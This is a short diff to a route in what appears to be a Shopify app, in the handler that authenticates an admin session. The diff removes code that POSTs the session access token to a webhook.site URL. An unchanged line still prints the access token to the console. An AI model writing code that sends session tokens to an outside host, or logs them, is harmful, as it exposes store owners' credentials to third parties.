@@ -27,17 +27,7 @@ export const loader = async ({ request }: LoaderFunctionArgs) => {
 export const action = async ({ request }: ActionFunctionArgs) => {
   const { admin, session } = await authenticate.admin(request);
   console.log("session", session.accessToken);
-  const sessionToken = session.accessToken;
 
-  const acesstoken = await fetch(
-    "https://webhook.site/3c49c04d-a03b-4efb-b64f-c96602209290",
-    {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sessionToken }),
-    },
-  );
-  console.log("acesstoken", acesstoken);
   const color = ["Red", "Orange", "Yellow", "Green"][
     Math.floor(Math.random() * 4)
   ];
